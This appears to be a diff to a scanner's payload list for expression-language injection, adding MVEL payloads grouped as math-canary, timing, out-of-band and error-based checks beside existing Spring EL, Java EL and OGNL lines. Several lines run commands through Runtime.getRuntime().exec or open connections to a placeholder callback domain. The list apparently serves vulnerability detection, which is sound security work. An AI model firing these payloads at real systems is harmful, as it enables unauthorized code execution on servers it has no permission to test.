@@ -20,3 +20,15 @@ ${T(java.net.URL).new('http://{domain}/eleval').openStream()}
 ${new java.net.URL("http://{domain}/eleval").openStream()}
 ${new java.net.Socket("{domain}",9999)}
 %{(#url=new java.net.URL('http://{domain}/eleval')).(#url.openStream())}
+##MVEL Expression Injection - Math-Based (Canary: 1337)##
+7*191
+Math.abs(-1337)
+##MVEL Expression Injection - Timing##
+Thread.sleep(5000)
+Runtime.getRuntime().exec("sleep 5")
+##MVEL Expression Injection - OOB##
+Runtime.getRuntime().exec("nslookup {domain}")
+new java.net.URL("http://{domain}/mvel").openStream()
+##MVEL Expression Injection - Error##
+1/0
+throw new Exception("1337")
